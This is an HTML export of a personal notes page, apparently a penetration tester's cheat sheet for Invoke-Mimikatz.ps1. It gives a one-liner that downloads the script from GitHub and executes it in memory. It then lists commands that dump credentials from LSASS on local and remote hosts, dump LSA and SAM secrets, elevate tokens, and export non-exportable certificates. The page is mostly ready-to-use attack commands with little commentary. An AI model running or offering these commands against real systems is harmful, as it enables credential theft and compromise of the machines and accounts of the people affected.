<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Invoke-Mimikatz.ps1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Tools - Invoke-Mimikatz.ps1</h1></strong><br />Invoke-Mimikatz.ps1 loads Mimikatz into memory without touching disk.<br />Uses <code>Invoke-ReflectivePEInjection</code> script.<br />Useful for when you don&#39;t want to drop a binary.<br /><br />â€¢ As of April 2020, gets blocked by Windows Defender<br /><br /><strong><h2>## Load</h2></strong><br />Load remotely<br /><div class="codebox"><div class="codebox">IEX&nbsp;(New-Object&nbsp;System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1&#39;)</div></div><br /><br /><strong><h2>## Run Mimikatz Commands</h2></strong><br />I will only document <code>Invoke-Mimikatz</code> added funcitonality, like <code>-DumpCreds</code>.<br />You can run mimikatz commands via <code>-Command</code>, so refer to mimikatz node for that.<br /><br /><code>-DumpCreds</code> - dump credentials out of LSASS<br /><code>-DumpCerts</code> - export all private certificates (even if they&#39;re marked as non-exportable)<br /><code>-ComputerName</code> - an array of computer hostnames to run the script on<br /><code>-Command</code> - supply custom mimikatz command<br /><br /><div class="codebox"><div class="codebox">#&nbsp;Dump&nbsp;creds&nbsp;from&nbsp;LSASS<br />#&nbsp;--------------------------------------<br />#&nbsp;locally&nbsp;dump&nbsp;creds&nbsp;from&nbsp;lsass&nbsp;memory<br />Invoke-Mimikatz&nbsp;-DumpCreds<br />#&nbsp;remotely&nbsp;dump&nbsp;creds&nbsp;from&nbsp;lsass&nbsp;memory&nbsp;(on&nbsp;multiple&nbsp;machines)<br />Invoke-Mimikatz&nbsp;-DumpCreds&nbsp;-ComputerName&nbsp;@(&quot;hostname1&quot;,&quot;hostname2&quot;)<br /><br />#&nbsp;Drump&nbsp;creds&nbsp;from&nbsp;NTDS.dit<br />#&nbsp;--------------------------------------<br />#&nbsp;locally&nbsp;dump&nbsp;creds&nbsp;from&nbsp;NTDS.dit<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;privilege::debug&quot;&nbsp;&quot;lsadump::lsa&nbsp;/inject&quot;&nbsp;exit&#39;<br />#&nbsp;remotely&nbsp;dump&nbsp;creds&nbsp;from&nbsp;NTDS.dit&nbsp;(on&nbsp;multiple&nbsp;machines)<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;privilege::debug&quot;&nbsp;&quot;lsadump::lsa&nbsp;/inject&quot;&nbsp;exit&#39;&nbsp;-ComputerName&nbsp;@(&quot;hostname1&quot;,&quot;hostname2&quot;)<br /><br />#&nbsp;Input&nbsp;your&nbsp;own&nbsp;Mimikatz&nbsp;commands<br />#&nbsp;--------------------------------------<br />Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;privilege::debug&quot;&nbsp;&quot;token::elevate&quot;&nbsp;&quot;sekurlsa::logonpasswords&quot;&nbsp;&quot;lsadump::sam&quot;&nbsp;&quot;exit&quot;&#39;</div></div></div>
</body>
</html>
